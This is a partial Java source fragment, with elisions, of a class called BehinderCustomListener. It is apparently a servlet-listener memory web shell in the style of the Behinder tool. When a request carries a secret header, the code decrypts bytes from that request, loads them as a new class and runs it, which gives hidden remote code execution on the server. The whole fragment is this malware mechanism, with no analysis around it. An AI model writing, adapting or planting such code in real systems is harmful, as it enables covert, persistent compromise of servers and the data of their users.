...
public class BehinderCustomListener extends ClassLoader implements ServletContextListener, EventListener {
    public static String headerName;
    public static String headerValue;

    public BehinderCustomListener() {
    }

    public BehinderCustomListener(ClassLoader c) {
        super(c);
    }
    ...
    @SuppressWarnings("all")
    public void handleRequest(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
        ...
        try {
            if (request.getHeader(this.headerName) != null
                ...
                Object instance = new BehinderCustomListener(Thread.currentThread().getContextClassLoader()).defineClass(decrypted, 0, decrypted.length).newInstance();
                instance.equals(obj);
                return;
            }
        } catch (Throwable e) {
